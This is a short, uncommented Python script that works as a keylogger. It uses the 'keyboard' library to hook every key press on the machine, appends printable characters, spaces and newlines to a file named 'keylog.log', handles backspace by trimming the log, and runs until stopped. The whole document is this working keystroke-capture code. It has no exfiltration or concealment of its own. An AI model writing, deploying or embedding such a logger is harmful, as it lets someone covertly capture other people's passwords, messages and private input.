import keyboard
import os

file = "keylog.log"

def keyPress(event):
    key = event.name
    
    if key == "space":
        key = " "

    elif key == "enter":
        key = "\n"

    elif key == "backspace":
        if os.path.exists(file):
            with open(file, "r+") as f:
                content = f.read()
                f.seek(0)
                f.write(content[:-1]) 
                f.truncate()
        return
    
    elif len(key) > 1: 
        return

    with open(file, "a") as f:
        f.write(key)

keyboard.on_press(keyPress)
keyboard.wait()

